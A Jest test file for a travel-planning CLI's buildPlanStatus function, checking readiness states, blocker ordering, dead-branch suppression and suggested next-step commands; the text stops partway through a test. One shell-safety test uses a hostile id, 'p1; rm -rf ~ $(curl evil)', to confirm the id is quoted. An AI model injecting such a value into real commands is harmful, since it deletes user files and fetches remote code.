import { describe, it, expect } from "@jest/globals";
import { readFileSync } from "node:fs";
import { buildPlanStatus, type PlanStatusQueryResult } from "./plan-status.js";

/**
 * VOY-1704 contract tests. buildPlanStatus is pure — same inputs, same output.
 * The JSON shape is the product: these tests pin the readiness precedence,
 * blocker ordering, and nextSteps mapping agents depend on.
 */

const BASE = "https://travel.voyagier.com";

const traveller = (id: string, over: Partial<{ gender: string | null; dateOfBirth: string | null }> = {}) => ({
  id,
  firstName: "T",
  lastName: id.toUpperCase(),
  gender: over.gender === undefined ? "FEMALE" : over.gender,
  dateOfBirth: over.dateOfBirth === undefined ? "1998-06-23" : over.dateOfBirth,
});

const choice = (travellerId: string, optionId: string | null) => ({
  traveller: { id: travellerId },
  selectedOption: optionId ? { id: optionId } : null,
});

function plan(over: Partial<NonNullable<PlanStatusQueryResult["tripPlan"]>> = {}): NonNullable<PlanStatusQueryResult["tripPlan"]> {
  return {
    id: "plan-1",
    title: "Test Plan",
    travellers: [traveller("t1")],
    cart: { itemCount: 0, total: 0, currency: "USD" },
    ...over,
  };
}

function goal(over: Record<string, unknown> = {}) {
  return {
    id: "g1",
    name: "Flights",
    type: "Flight",
    sortOrder: 0,
    isDecided: false,
    isBooked: false,
    checkoutReadiness: { isReady: false, requirements: [] },
    items: [],
    ...over,
  };
}

const pickedSelection = (id = "s1") => ({
  id,
  type: "Flight",
  blueprintMonitorId: "m1",
  options: [{ id: "o1", name: "BWI to MCO", isBookable: true }],
  travellerOptionChoices: [choice("t1", "o1")],
});

/** Cart with one item that joins to pickedSelection()'s bookable option. */
const bookableCart = (id = "s1", over: Record<string, unknown> = {}) => ({
  itemCount: 1,
  total: 339.1,
  currency: "USD",
  items: [{ selectionId: id, optionId: "o1", ...over }],
});

describe("buildPlanStatus — readiness precedence", () => {
  it("BOOKED beats everything when all goals are booked — and terminal state clears blockers/nextSteps", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan({ travellers: [traveller("t1", { gender: null })] }),
        tripPlanGoals: [goal({ isBooked: true })],
      },
      BASE,
    );
    expect(s.readiness).toBe("BOOKED");
    expect(s.summary.goalsBooked).toBe(1);
    // Terminal: no contradictory advice next to a BOOKED verdict.
    expect(s.blockers).toEqual([]);
    expect(s.waiting).toEqual([]);
    expect(s.nextSteps).toEqual([]);
    expect(s.summary.blockerCount).toBe(0);
  });

  it("BLOCKED when any blocker exists, even with waits pending", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan({ travellers: [traveller("t1", { gender: null })] }),
        tripPlanGoals: [
          goal({
            checkoutReadiness: {
              isReady: false,
              requirements: [
                { label: "Gender", isFulfilled: false, isRequired: true, type: "TravellerField", missingTravellerIds: ["t1"] },
              ],
            },
            items: [
              {
                id: "i1",
                selections: [
                  { id: "s1", type: "Flight", blueprintMonitorId: "m1", options: [] }, // FETCHING
                ],
              },
            ],
          }),
        ],
      },
      BASE,
    );
    expect(s.readiness).toBe("BLOCKED");
    expect(s.blockers.map((b) => b.kind)).toEqual(["TRAVELLER_DATA"]);
    expect(s.waiting.map((w) => w.kind)).toEqual(["OPTIONS_PENDING"]);
  });

  it("IN_PROGRESS when only self-resolving waits remain", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan(),
        tripPlanGoals: [
          goal({
            items: [
              { id: "i1", selections: [{ id: "s1", type: "Flight", blueprintMonitorId: "m1", options: [] }] },
            ],
          }),
        ],
      },
      BASE,
    );
    expect(s.readiness).toBe("IN_PROGRESS");
    expect(s.blockers).toEqual([]);
  });

  it("READY_TO_BOOK when no blockers, no waits, cart has ≥1 BOOKABLE item", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan({ cart: bookableCart() }),
        tripPlanGoals: [
          goal({
            isDecided: true,
            checkoutReadiness: { isReady: true, requirements: [] },
            items: [{ id: "i1", selections: [pickedSelection()] }],
          }),
        ],
      },
      BASE,
    );
    expect(s.readiness).toBe("READY_TO_BOOK");
    expect(s.cart.bookableCount).toBe(1);
    expect(s.nextSteps).toEqual(["voyagier book plan-1 --dry-run"]);
  });

  it("cart items that don't join to a bookable option gate READY_TO_BOOK (no false ready)", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan({
          cart: { itemCount: 1, total: 100, currency: "USD", items: [{ selectionId: "s1", optionId: "o-unknown" }] },
        }),
        tripPlanGoals: [
          goal({
            isDecided: true,
            checkoutReadiness: { isReady: true, requirements: [] },
            items: [{ id: "i1", selections: [pickedSelection()] }],
          }),
        ],
      },
      BASE,
    );
    expect(s.cart.bookableCount).toBe(0);
    expect(s.readiness).toBe("IN_PROGRESS");
    expect(s.waiting[0].kind).toBe("CART_PENDING");
    expect(s.waiting[0].message).toContain("none report bookable");
  });

  it("empty cart with nothing pending → IN_PROGRESS with a CART_PENDING wait, never a silent READY", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan(),
        tripPlanGoals: [
          goal({
            isDecided: true,
            checkoutReadiness: { isReady: true, requirements: [] },
            items: [{ id: "i1", selections: [pickedSelection()] }],
          }),
        ],
      },
      BASE,
    );
    expect(s.readiness).toBe("IN_PROGRESS");
    expect(s.waiting.map((w) => w.kind)).toEqual(["CART_PENDING"]);
    expect(s.nextSteps.some((c) => c.includes("voyagier cart plan-1"))).toBe(true);
  });

  it("passport joins traveller `missing` (and blocks) only when a cart item requires it", () => {
    const goals = [
      goal({
        isDecided: true,
        checkoutReadiness: { isReady: true, requirements: [] },
        items: [{ id: "i1", selections: [pickedSelection()] }],
      }),
    ];
    // Domestic (requiresPassport absent): no passport gap.
    const domestic = buildPlanStatus(
      { tripPlan: plan({ cart: bookableCart() }), tripPlanGoals: goals },
      BASE,
    );
    expect(domestic.travellers[0].missing).toEqual([]);
    expect(domestic.readiness).toBe("READY_TO_BOOK");
    // International (server says requiresPassport): traveller without passport blocks.
    const intl = buildPlanStatus(
      { tripPlan: plan({ cart: bookableCart("s1", { requiresPassport: true }) }), tripPlanGoals: goals },
      BASE,
    );
    expect(intl.travellers[0].missing).toEqual(["passport"]);
    expect(intl.readiness).toBe("BLOCKED");
    expect(intl.blockers[0].kind).toBe("TRAVELLER_DATA");
    expect(intl.blockers[0].message).toContain("passport");
    // nextSteps tailored to the actual gap — passport flags, no gender/dob noise.
    expect(intl.nextSteps[0]).toBe(
      "voyagier travellers update t1 --passport-number <number> --passport-country <code> --passport-expiry <YYYY-MM>",
    );
  });

  it("buildPlanStatus throws a clear error on null tripPlan", () => {
    expect(() => buildPlanStatus({ tripPlan: null, tripPlanGoals: [] }, BASE)).toThrow(
      /tripPlan is null/,
    );
  });
});

describe("buildPlanStatus — blockers", () => {
  it("orders blockers traveller-data → inputs → picks → requirements", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan({ travellers: [traveller("t1", { dateOfBirth: null })] }),
        tripPlanGoals: [
          goal({
            checkoutReadiness: {
              isReady: false,
              requirements: [
                { label: "Passport required", isFulfilled: false, isRequired: true, selectionId: "s-other", type: "ParticipantChoice" },
                { label: "Date of birth", isFulfilled: false, isRequired: true, type: "TravellerField", missingTravellerIds: ["t1"] },
              ],
            },
            items: [
              {
                id: "i1",
                selections: [
                  {
                    id: "s-input",
                    type: "Date",
                    blueprintMonitorId: null, // AWAITING_INPUT
                    options: [],
                    inputs: [{ id: "in1", fieldName: "departureDate", fieldLabel: "Departure date", isRequired: true, value: null, sourceOutputId: null }],
                  },
                  {
                    id: "s-pick",
                    type: "Flight",
                    blueprintMonitorId: "m1",
                    options: [{ id: "o1", name: "A" }],
                    travellerOptionChoices: [choice("t1", null)],
                  },
                ],
              },
            ],
          }),
        ],
      },
      BASE,
    );
    expect(s.blockers.map((b) => b.kind)).toEqual([
      "TRAVELLER_DATA",
      "SELECTION_INPUT",
      "PICK_PENDING",
      "REQUIREMENT_UNMET",
    ]);
    // The TravellerField requirement dedupes onto the TRAVELLER_DATA root cause.
    expect(s.blockers.filter((b) => b.message.includes("Date of birth"))).toEqual([]);
    // SELECTION_INPUT names the field (honesty rule)
    expect(s.blockers[1].message).toContain("Departure date");
    // nextSteps map 1:1, deduped, runnable
    expect(s.nextSteps).toEqual([
      "voyagier travellers update t1 --dob <YYYY-MM-DD>",
      "voyagier plans goal g1 --json   # inspect the blocking requirements",
      "voyagier selection-options s-pick --json   # list options",
      "voyagier select --selection-id s-pick --option-id <optionId>",
    ]);
  });

  it("kind ordering holds across goals (PICK_PENDING in an earlier goal sorts after SELECTION_INPUT in a later one)", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan(),
        tripPlanGoals: [
          goal({
            id: "g1",
            sortOrder: 0,
            items: [
              {
                id: "i1",
                selections: [
                  { id: "s-pick", type: "Flight", blueprintMonitorId: "m1", options: [{ id: "o1", name: "A" }], travellerOptionChoices: [choice("t1", null)] },
                ],
              },
            ],
          }),
          goal({
            id: "g2",
            sortOrder: 1,
            items: [
              {
                id: "i2",
                selections: [
                  {
                    id: "s-input",
                    type: "Date",
                    blueprintMonitorId: null,
                    options: [],
                    inputs: [{ id: "in1", fieldName: "checkin", fieldLabel: "Check-in", isRequired: true, value: null, sourceOutputId: null }],
                  },
                ],
              },
            ],
          }),
        ],
      },
      BASE,
    );
    expect(s.blockers.map((b) => b.kind)).toEqual(["SELECTION_INPUT", "PICK_PENDING"]);
  });

  it("AWAITING_INPUT with no named inputs is dependency-pending — detail only, NO blocker", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan(),
        tripPlanGoals: [
          goal({
            items: [
              { id: "i1", selections: [{ id: "s1", type: "Date", blueprintMonitorId: null, options: [], inputs: [] }] },
            ],
          }),
        ],
      },
      BASE,
    );
    expect(s.blockers).toEqual([]);
    expect(s.goals[0].selections[0].status).toBe("AWAITING_INPUT");
    expect(s.goals[0].selections[0].blockedOnUnavailable).toBe(true);
  });

  it("requirements rooted in already-reported missing traveller data are deduped", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan({ travellers: [traveller("t1", { gender: null })] }),
        tripPlanGoals: [
          goal({
            id: "g1",
            name: "Outbound",
            checkoutReadiness: {
              isReady: false,
              requirements: [
                { label: "Gender", isFulfilled: false, isRequired: true, type: "TravellerField", missingTravellerIds: ["t1"] },
                { label: "Cabin class", isFulfilled: false, isRequired: true, type: "ParticipantChoice", missingTravellerIds: [] },
              ],
            },
          }),
          goal({
            id: "g2",
            name: "Return",
            sortOrder: 1,
            checkoutReadiness: {
              isReady: false,
              requirements: [
                { label: "Gender", isFulfilled: false, isRequired: true, type: "TravellerField", missingTravellerIds: ["t1"] },
              ],
            },
          }),
        ],
      },
      BASE,
    );
    // One TRAVELLER_DATA root cause, not three; Cabin class survives (not traveller-rooted).
    expect(s.blockers.map((b) => `${b.kind}:${b.message}`)).toEqual([
      "TRAVELLER_DATA:T T1 is missing gender (required for checkout)",
      "REQUIREMENT_UNMET:Outbound: Cabin class (server reports this unmet but references no selection — may be stale; verify with book --dry-run)",
    ]);
  });

  it("requirements without a selection ref are flagged unverified and route to book --dry-run, not a plans-goal dead-loop (VOY-1714/VOY-1715)", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan({ travellers: [traveller("t1")] }),
        tripPlanGoals: [
          goal({
            id: "g1",
            name: "Outbound",
            checkoutReadiness: {
              isReady: false,
              requirements: [
                // The VOY-1715 phantom: no selectionId, no missing travellers —
                // the fulfilling FlightClass selection lives in another goal and
                // isFulfilled never flips server-side.
                { label: "Cabin class", isFulfilled: false, isRequired: true, type: "ParticipantChoice", missingTravellerIds: [] },
                // A verifiable requirement keeps the normal inspect route.
                { label: "Passport required", isFulfilled: false, isRequired: true, selectionId: "s-other", type: "ParticipantChoice" },
              ],
            },
          }),
        ],
      },
      BASE,
    );
    const phantom = s.blockers.find((b) => b.message.includes("Cabin class"));
    const verifiable = s.blockers.find((b) => b.message.includes("Passport required"));
    expect(phantom).toMatchObject({ kind: "REQUIREMENT_UNMET", unverified: true });
    expect(phantom!.refs.selectionId).toBeUndefined();
    expect(verifiable!.unverified).toBeUndefined();
    // Unverified → checkout-truth tie-breaker; verified → goal inspection.
    expect(s.nextSteps).toContain(
      "voyagier book plan-1 --dry-run --json   # checkout truth — if blockers are [], this requirement is a stale server ref",
    );
    expect(s.nextSteps).toContain(
      "voyagier plans goal g1 --json   # inspect the blocking requirements",
    );
  });

  it("traveller gaps do NOT block when no server requirement demands the field (hotel-only plan)", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan({
          travellers: [traveller("t1", { gender: null, dateOfBirth: null })],
          cart: bookableCart(),
        }),
        tripPlanGoals: [
          goal({
            name: "Hotel",
            type: "Hotel",
            isDecided: true,
            checkoutReadiness: { isReady: true, requirements: [] },
            items: [{ id: "i1", selections: [pickedSelection()] }],
          }),
        ],
      },
      BASE,
    );
    // Informational gap stays visible; no blocker, plan can proceed.
    expect(s.travellers[0].missing).toEqual(["gender", "dateOfBirth"]);
    expect(s.blockers).toEqual([]);
    expect(s.readiness).toBe("READY_TO_BOOK");
  });

  it("requirement already covered by a selection blocker is deduped", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan(),
        tripPlanGoals: [
          goal({
            checkoutReadiness: {
              isReady: false,
              requirements: [{ label: "Pick a flight", isFulfilled: false, isRequired: true, selectionId: "s1" }],
            },
            items: [
              {
                id: "i1",
                selections: [
                  { id: "s1", type: "Flight", blueprintMonitorId: "m1", options: [{ id: "o1", name: "A" }], travellerOptionChoices: [choice("t1", null)] },
                ],
              },
            ],
          }),
        ],
      },
      BASE,
    );
    expect(s.blockers.map((b) => b.kind)).toEqual(["PICK_PENDING"]);
  });

  it("List-mode selections never produce PICK_PENDING (they are mirror sources, not decision surfaces)", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan({ cart: { itemCount: 1, total: 10, currency: "USD" } }),
        tripPlanGoals: [
          goal({
            items: [
              {
                id: "i1",
                selections: [
                  { id: "s-list", type: "FlightList", mode: "List", blueprintMonitorId: "m1", options: [{ id: "o1", name: "A" }], travellerOptionChoices: [choice("t1", null)] },
                ],
              },
            ],
          }),
        ],
      },
      BASE,
    );
    expect(s.blockers).toEqual([]);
    expect(s.goals[0].selections[0].mode).toBe("List");
  });

  it("server isComplete=true suppresses PICK_PENDING regardless of choice rows", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan({ cart: { itemCount: 1, total: 10, currency: "USD" } }),
        tripPlanGoals: [
          goal({
            items: [
              {
                id: "i1",
                selections: [
                  { id: "s1", type: "Flight", mode: "Single", isComplete: true, blueprintMonitorId: "m1", options: [{ id: "o1", name: "A" }], travellerOptionChoices: [] },
                ],
              },
            ],
          }),
        ],
      },
      BASE,
    );
    expect(s.blockers).toEqual([]);
    expect(s.goals[0].selections[0].isComplete).toBe(true);
  });

  it("locked selections never produce blockers", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan({ cart: { itemCount: 1, total: 10, currency: "USD" } }),
        tripPlanGoals: [
          goal({
            items: [
              { id: "i1", selections: [{ id: "s1", type: "Date", isLocked: true, blueprintMonitorId: null, options: [], inputs: [] }] },
            ],
          }),
        ],
      },
      BASE,
    );
    expect(s.blockers).toEqual([]);
  });
});

describe("buildPlanStatus — divergent picks are valid (demmersong 2026-07-20)", () => {
  it("all travellers picked different options: allPicked=true, consensus=false, NO blocker", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan({
          travellers: [traveller("t1"), traveller("t2")],
          cart: {
            itemCount: 2,
            total: 500,
            currency: "USD",
            items: [
              { selectionId: "s1", optionId: "o1" },
              { selectionId: "s1", optionId: "o2" },
            ],
          },
        }),
        tripPlanGoals: [
          goal({
            items: [
              {
                id: "i1",
                selections: [
                  {
                    id: "s1",
                    type: "Flight",
                    blueprintMonitorId: "m1",
                    options: [
                      { id: "o1", name: "A", isBookable: true },
                      { id: "o2", name: "B", isBookable: true },
                    ],
                    travellerOptionChoices: [choice("t1", "o1"), choice("t2", "o2")],
                  },
                ],
              },
            ],
          }),
        ],
      },
      BASE,
    );
    const sel = s.goals[0].selections[0];
    expect(sel.allPicked).toBe(true);
    expect(sel.consensus).toBe(false);
    expect(sel.chosenOptionId).toBeNull();
    expect(s.blockers).toEqual([]);
    expect(s.readiness).toBe("READY_TO_BOOK");
  });

  it("partial picks → PICK_PENDING naming the count still to pick", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan({ travellers: [traveller("t1"), traveller("t2")] }),
        tripPlanGoals: [
          goal({
            items: [
              {
                id: "i1",
                selections: [
                  {
                    id: "s1",
                    type: "Flight",
                    blueprintMonitorId: "m1",
                    options: [{ id: "o1", name: "A" }],
                    travellerOptionChoices: [choice("t1", "o1"), choice("t2", null)],
                  },
                ],
              },
            ],
          }),
        ],
      },
      BASE,
    );
    expect(s.blockers[0].kind).toBe("PICK_PENDING");
    expect(s.blockers[0].message).toContain("1 traveller(s) still need to pick");
    expect(s.goals[0].selections[0].travellersPending).toEqual(["t2"]);
  });
});

describe("buildPlanStatus — misc contract", () => {
  it("consensus pick surfaces chosenOptionName", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan({ cart: bookableCart() }),
        tripPlanGoals: [goal({ items: [{ id: "i1", selections: [pickedSelection()] }] })],
      },
      BASE,
    );
    const sel = s.goals[0].selections[0];
    expect(sel.chosenOptionName).toBe("BWI to MCO");
    expect(sel.consensus).toBe(true);
  });

  it("empty plan (no goals, no travellers) → IN_PROGRESS via CART_PENDING, url built from base", () => {
    const s = buildPlanStatus({ tripPlan: plan({ travellers: [] }), tripPlanGoals: [] }, BASE);
    expect(s.readiness).toBe("IN_PROGRESS");
    expect(s.url).toBe("https://travel.voyagier.com/plans/plan-1");
    expect(s.summary).toEqual({ goalsTotal: 0, goalsDecided: 0, goalsBooked: 0, blockerCount: 0, alternateBranchCount: 0, bookableNow: false });
  });

  it("goals sort by sortOrder", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan(),
        tripPlanGoals: [goal({ id: "g2", sortOrder: 5, name: "Second" }), goal({ id: "g1", sortOrder: 1, name: "First" })],
      },
      BASE,
    );
    expect(s.goals.map((g) => g.name)).toEqual(["First", "Second"]);
  });
});

// ── nextSteps shell safety (VOY-1709) ──

describe("buildPlanStatus — nextSteps shell safety", () => {
  it("shell-quotes hostile server ids so nextSteps stay safe to paste/run", () => {
    const hostileId = "p1; rm -rf ~ $(curl evil)";
    const s = buildPlanStatus(
      {
        tripPlan: plan({ id: hostileId, cart: bookableCart() }),
        tripPlanGoals: [
          goal({
            isDecided: true,
            checkoutReadiness: { isReady: true, requirements: [] },
            items: [{ id: "i1", selections: [pickedSelection()] }],
          }),
        ],
      },
      BASE,
    );
    const bookStep = s.nextSteps.find((c) => c.startsWith("voyagier book"));
    expect(bookStep).toBe("voyagier book 'p1; rm -rf ~ $(curl evil)' --dry-run");
  });

  it("leaves normal UUID ids unquoted (no behavior change for real data)", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan({ cart: bookableCart() }),
        tripPlanGoals: [
          goal({
            isDecided: true,
            checkoutReadiness: { isReady: true, requirements: [] },
            items: [{ id: "i1", selections: [pickedSelection()] }],
          }),
        ],
      },
      BASE,
    );
    expect(s.nextSteps).toEqual(["voyagier book plan-1 --dry-run"]);
  });
});

// ── VOY-1718: dead-branch suppression + aggregation + downgrade ──────────────

/** Load the anonymized Singapore-shaped fixture (real prod goal graph shape:
 *  6-hotel list, 7 room lists, 13 room mirrors, one complete chain, two
 *  incomplete rates, a RoomArrangement, a dead-branch "Room" requirement). */
const SINGAPORE = JSON.parse(
  readFileSync(new URL("./plan-status-singapore.fixture.json", import.meta.url), "utf-8"),
) as PlanStatusQueryResult;

const findGoal = (s: ReturnType<typeof buildPlanStatus>, name: string) =>
  s.goals.find((g) => g.name === name)!;
const findSel = (g: { selections: { selectionId: string }[] }, prefix: string) =>
  g.selections.find((sel) => sel.selectionId.startsWith(prefix))!;

describe("buildPlanStatus — VOY-1718 dead-branch suppression (Singapore fixture)", () => {
  const s = buildPlanStatus(SINGAPORE, BASE);

  it("stays BLOCKED but collapses phantom room/rate picks (17 raw → 5 real blockers)", () => {
    expect(s.readiness).toBe("BLOCKED");
    // 1 passport + 1 RoomArrangement pick + 2 null-ref Cabin class + 1 dead-branch Room.
    // (Raw, un-suppressed, this plan emits 17: +12 HotelRoom +1 HotelRoomRate PICK_PENDING.)
    expect(s.summary.blockerCount).toBe(5);
    expect(s.blockers.map((b) => b.kind)).toEqual([
      "TRAVELLER_DATA",
      "PICK_PENDING",
      "REQUIREMENT_UNMET",
      "REQUIREMENT_UNMET",
      "REQUIREMENT_UNMET",
    ]);
  });

  it("the ONE surviving PICK_PENDING is the RoomArrangement (a distinct type with no complete sibling)", () => {
    const picks = s.blockers.filter((b) => b.kind === "PICK_PENDING");
    expect(picks).toHaveLength(1);
    expect(picks[0].refs.selectionId).toMatch(/^5a060e34/);
    const lodging = findGoal(s, "Secure Lodging");
    expect(findSel(lodging, "5a060e34").branch).toBe("active");
  });

  it("passport is the sole real TRAVELLER_DATA blocker (international cart item)", () => {
    const td = s.blockers.filter((b) => b.kind === "TRAVELLER_DATA");
    expect(td).toHaveLength(1);
    expect(td[0].message).toContain("passport");
    expect(s.cart.bookableCount).toBe(2);
  });

  it("suppresses every incomplete HotelRoom / HotelRoomRate under the chosen and unchosen hotels", () => {
    expect(s.summary.alternateBranchCount).toBe(14); // 12 rooms + 2 rates
    const lodging = findGoal(s, "Secure Lodging");
    expect(lodging.alternateBranchCount).toBe(14);
    const tally = lodging.selections.reduce<Record<string, number>>((acc, sel) => {
      acc[sel.branch] = (acc[sel.branch] ?? 0) + 1;
      return acc;
    }, {});
    expect(tally).toEqual({ active: 12, alternate: 4, deadBranch: 10 });
  });

  it("classifies same-list siblings 'alternate' and different-list siblings 'deadBranch'", () => {
    const lodging = findGoal(s, "Secure Lodging");
    // e9acd7ac & f1814b93 mirror the chosen hotel's list (17e3e67c) → alternate.
    expect(findSel(lodging, "e9acd7ac").branch).toBe("alternate");
    expect(findSel(lodging, "f1814b93").branch).toBe("alternate");
    // 2b848f72 & f3d5d736 mirror a DIFFERENT hotel's list (7c316104) → deadBranch.
    expect(findSel(lodging, "2b848f72").branch).toBe("deadBranch");
    expect(findSel(lodging, "f3d5d736").branch).toBe("deadBranch");
    // Rates carry no mirror id; their completed sibling also has none → alternate.
    expect(findSel(lodging, "2b27cd21").branch).toBe("alternate");
    expect(findSel(lodging, "46c1a5f2").branch).toBe("alternate");
  });

  it("the completed chain (room 5ae55313, rate 728496c5, hotel ae4d7eb1) stays 'active'", () => {
    const lodging = findGoal(s, "Secure Lodging");
    expect(findSel(lodging, "5ae55313").branch).toBe("active");
    expect(findSel(lodging, "728496c5").branch).toBe("active");
    expect(findSel(lodging, "ae4d7eb1").branch).toBe("active");
  });

  it("downgrades the 'Room' requirement that points at a dead branch — visible, unverified, book --dry-run", () => {
    const room = s.blockers.find((b) => b.message.startsWith("Secure Lodging: Room"));
    expect(room).toMatchObject({ kind: "REQUIREMENT_UNMET", unverified: true });
    expect(room!.refs.selectionId).toMatch(/^2b848f72/);
    expect(room!.message).toContain("references an alternate branch");
    // Its fix routes to the checkout truth, not a plans-goal dead-loop.
    expect(s.nextSteps).toContain(
      "voyagier book 22dbcc12-a8ce-47c0-8fe9-cf67df9fd537 --dry-run --json   # checkout truth — if blockers are [], this requirement is a stale server ref",
    );
  });

  it("the two null-ref 'Cabin class' requirements stay unverified (unchanged VOY-1715 behavior)", () => {
    const cabins = s.blockers.filter((b) => b.message.includes("Cabin class"));
    expect(cabins).toHaveLength(2);
    for (const c of cabins) {
      expect(c.unverified).toBe(true);
      expect(c.refs.selectionId).toBeUndefined();
    }
  });

  it("leaves other goals' selections untouched (multi-goal isolation)", () => {
    // The flight goals carry their own Single selections; none are suppressed —
    // suppression groups strictly WITHIN a goal.
    for (const name of ["Outbound Flights", "Return Flights", "Flight Booking Details"]) {
      const g = findGoal(s, name);
      expect(g.alternateBranchCount).toBe(0);
      expect(g.selections.every((sel) => sel.branch === "active")).toBe(true);
    }
  });

  it("exposes the additive contract keys (branch / alternateBranchCount) without dropping existing keys", () => {
    const lodging = findGoal(s, "Secure Lodging");
    const sel = lodging.selections[0];
    expect(sel).toHaveProperty("branch");
    expect(sel).toHaveProperty("selectionId");
    expect(sel).toHaveProperty("chosenOptionId");
    expect(lodging).toHaveProperty("alternateBranchCount");
    expect(s.summary).toHaveProperty("alternateBranchCount");
  });
});

describe("buildPlanStatus — VOY-1718 aggregation (no completion evidence yet)", () => {
  // A hotel goal where NOTHING is settled: the parent Hotel is unpicked and
  // every room mirror is pending. The room picks collapse into ONE aggregated
  // blocker; the parent Hotel decision keeps its own PICK_PENDING (pick it first).
  const roomMirror = (id: string, mirror: string) => ({
    id,
    type: "HotelRoom",
    mode: "Single",
    isComplete: false,
    blueprintMonitorId: "m",
    mirrorListSelectionId: mirror,
    options: [{ id: `${id}-o`, name: "Room", isBookable: false }],
    travellerOptionChoices: [choice("t1", null)],
  });
  const s = buildPlanStatus(
    {
      tripPlan: plan({ cart: { itemCount: 0, total: 0, currency: "USD", items: [] } }),
      tripPlanGoals: [
        goal({
          id: "gh",
          name: "Secure Lodging",
          type: "Hotel",
          items: [
            {
              id: "i1",
              selections: [
                {
                  id: "hotel-dec",
                  type: "Hotel",
                  mode: "Single",
                  isComplete: false,
                  blueprintMonitorId: "m",
                  mirrorListSelectionId: "hotel-list",
                  options: [{ id: "h1", name: "Hotel A", isBookable: false }],
                  travellerOptionChoices: [choice("t1", null)],
                },
                { id: "hotel-list", type: "HotelList", mode: "List", blueprintMonitorId: "m", options: [{ id: "h1", name: "Hotel A" }] },
                roomMirror("room-a", "list-a"),
                roomMirror("room-b", "list-b"),
                roomMirror("room-c", "list-c"),
              ],
            },
          ],
        }),
      ],
    },
    BASE,
  );

  it("collapses the ≥2 pending room mirrors into ONE aggregated PICK_PENDING", () => {
    const picks = s.blockers.filter((b) => b.kind === "PICK_PENDING");
    // One aggregate (rooms) + one for the parent Hotel decision.
    expect(picks).toHaveLength(2);
    const agg = picks.find((b) => b.candidateSelectionIds);
    expect(agg).toBeTruthy();
    expect(agg!.candidateSelectionIds!.sort()).toEqual(["room-a", "room-b", "room-c"]);
    expect(agg!.refs.selectionId).toBeUndefined();
    expect(agg!.refs.goalId).toBe("gh");
    expect(agg!.message).toContain("pick pending");
    expect(agg!.message).toContain("3 candidate selection(s)");
  });

  it("keeps the parent Hotel decision's own PICK_PENDING (pick the parent first)", () => {
    const hotelPick = s.blockers.find((b) => b.refs.selectionId === "hotel-dec");
    expect(hotelPick).toMatchObject({ kind: "PICK_PENDING" });
  });

  it("does NOT count aggregated candidates as alternate branches (they're live picks)", () => {
    expect(s.summary.alternateBranchCount).toBe(0);
  });

  it("routes the aggregate to `plans goal ... inspect candidate selections`", () => {
    expect(s.nextSteps).toContain("voyagier plans goal gh --json   # inspect candidate selections");
  });
});

describe("buildPlanStatus — VOY-1718 grouping is per-goal, not global", () => {
  it("a complete sibling in goal A does not suppress the same type in goal B", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan({ cart: { itemCount: 0, total: 0, currency: "USD", items: [] } }),
        tripPlanGoals: [
          goal({
            id: "gA",
            name: "Hotel A",
            type: "Hotel",
            items: [
              {
                id: "iA",
                selections: [
                  { id: "roomA-done", type: "HotelRoom", mode: "Single", isComplete: true, blueprintMonitorId: "m", mirrorListSelectionId: "lstA", options: [{ id: "oA", name: "R" }], travellerOptionChoices: [choice("t1", "oA")] },
                  { id: "roomA-alt", type: "HotelRoom", mode: "Single", isComplete: false, blueprintMonitorId: "m", mirrorListSelectionId: "lstX", options: [{ id: "oX", name: "R" }], travellerOptionChoices: [choice("t1", null)] },
                ],
              },
            ],
          }),
          goal({
            id: "gB",
            name: "Hotel B",
            type: "Hotel",
            sortOrder: 1,
            items: [
              {
                id: "iB",
                selections: [
                  { id: "roomB", type: "HotelRoom", mode: "Single", isComplete: false, blueprintMonitorId: "m", mirrorListSelectionId: "lstB", options: [{ id: "oB", name: "R" }], travellerOptionChoices: [choice("t1", null)] },
                ],
              },
            ],
          }),
        ],
      },
      BASE,
    );
    // Goal A: the incomplete sibling is suppressed (its type has a complete member).
    const gA = s.goals.find((g) => g.goalId === "gA")!;
    expect(gA.alternateBranchCount).toBe(1);
    expect(gA.selections.find((x) => x.selectionId === "roomA-alt")!.branch).toBe("deadBranch");
    // Goal B: no complete sibling in ITS group, single member → ordinary PICK_PENDING.
    const gB = s.goals.find((g) => g.goalId === "gB")!;
    expect(gB.alternateBranchCount).toBe(0);
    expect(gB.selections[0].branch).toBe("active");
    expect(s.blockers.some((b) => b.refs.selectionId === "roomB" && b.kind === "PICK_PENDING")).toBe(true);
  });
});

describe("buildPlanStatus — VOY-1718 suppression covers ALL emissions, not just PICK_PENDING", () => {
  const goalWithSettledRoom = (extraSelections: Record<string, unknown>[]) =>
    goal({
      id: "gS",
      name: "Secure Lodging",
      type: "Hotel",
      items: [
        {
          id: "iS",
          selections: [
            {
              id: "room-done",
              type: "HotelRoom",
              mode: "Single",
              isComplete: true,
              blueprintMonitorId: "m",
              mirrorListSelectionId: "lst-chosen",
              options: [{ id: "oD", name: "Deluxe" }],
              travellerOptionChoices: [choice("t1", "oD")],
            },
            ...extraSelections,
          ],
        },
      ],
    });

  it("a dead-branch selection AWAITING a named input emits NO SELECTION_INPUT blocker", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan(),
        tripPlanGoals: [
          goalWithSettledRoom([
            {
              id: "room-dead-input",
              type: "HotelRoom",
              mode: "Single",
              isComplete: false,
              blueprintMonitorId: null, // AWAITING_INPUT
              mirrorListSelectionId: "lst-unchosen",
              options: [],
              inputs: [{ id: "in1", fieldName: "bedType", fieldLabel: "Bed type", isRequired: true, value: null, sourceOutputId: null }],
            },
          ]),
        ],
